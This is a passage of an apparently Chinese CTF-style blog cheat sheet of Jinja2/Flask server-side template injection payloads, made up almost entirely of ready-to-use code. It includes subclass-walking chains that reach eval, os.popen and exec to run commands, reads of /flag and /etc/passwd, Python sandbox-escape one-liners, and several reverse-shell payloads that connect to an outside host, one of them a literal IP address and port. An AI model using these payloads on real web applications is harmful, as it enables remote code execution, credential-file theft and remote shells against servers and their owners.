flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>x的含义是可以为任意字母，不仅仅限于x</code></li></ul><ol start="5"><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>文件读取:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>x的含义是可以为任意字母，不仅仅限于x</code></li></ul><h1 id="命令执行-eval"><a href="#命令执行-eval" class="headerlink" title="命令执行_eval"></a><code>命令执行_eval</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-os-py"><a href="#命令执行-os-py" class="headerlink" title="命令执行_os.py"></a><code>命令执行_os.py</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-popen"><a href="#命令执行-popen" class="headerlink" title="命令执行_popen"></a><code>命令执行_popen</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-frozen-importlib-BuiltinImporter"><a href="#命令执行-frozen-importlib-BuiltinImporter" class="headerlink" title="命令执行__frozen_importlib.BuiltinImporter"></a><code>命令执行__frozen_importlib.BuiltinImporter</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;BuiltinImporter&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls /&quot;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-linecache"><a href="#命令执行-linecache" class="headerlink" title="命令执行_linecache"></a><code>命令执行_linecache</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-exec-无回显故反弹shell"><a href="#命令执行-exec-无回显故反弹shell" class="headerlink" title="命令执行_exec(无回显故反弹shell)"></a><code>命令执行_exec(无回显故反弹shell)</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-catch-warnings"><a href="#命令执行-catch-warnings" class="headerlink" title="命令执行_catch_warnings"></a><code>命令执行_catch_warnings</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;war&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="catch-warnings-读取文件"><a href="#catch-warnings-读取文件" class="headerlink" title="catch_warnings 读取文件"></a><code>catch_warnings 读取文件</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="frozen-importlib-external-FileLoader-读取文件"><a href="#frozen-importlib-external-FileLoader-读取文件" class="headerlink" title="_frozen_importlib_external.FileLoader 读取文件"></a><code>_frozen_importlib_external.FileLoader 读取文件</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"> # </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__bases__[0].__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;FileLoader&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="其他RCE"><a href="#其他RCE" class="headerlink" title="其他RCE"></a><code>其他RCE</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;application.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;joiner.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;namespace.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.current_app.add_url_rule(&#x27;/1333337&#x27;,view_func=url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="思路一：如果object的某个派生类中存在险方法，就可以直接拿来用"><a href="#思路一：如果object的某个派生类中存在险方法，就可以直接拿来用" class="headerlink" title="思路一：如果object的某个派生类中存在险方法，就可以直接拿来用"></a><code>思路一：如果object的某个派生类中存在险方法，就可以直接拿来用</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__sub</span><br><span class="hljs-template-tag"></span><br><span class="hljs-template-tag">classes__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;123.3.3.3&quot;,111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-1"><a href="#Python3-1" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">37</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<span class="hljs-comment"># Python2</span><br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;.bash_history&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h1 id="思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法"><a href="#思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法" class="headerlink" title="思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法"></a><code>思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> sys_module = cls.__init__.__globals__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> sys_module and &#x27;os&#x27; <span class="hljs-keyword">in</span> sys_module.modules %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; sys_module.modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-2"><a href="#Python3-2" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-1"><a href="#Python2-1" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a><code>思路三</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-3"><a href="#Python3-3" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">170</span>].__init__.__globals__[<span class="hljs-string">&#x27;_collections_abc&#x27;</span>].__dict__(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-2"><a href="#Python2-2" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>],system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="特例："><a href="#特例：" class="headerlink" title="特例："></a><code>特例：</code></h1><h1 id="Python3-4"><a href="#Python3-4" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-3"><a href="#Python2-3" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span 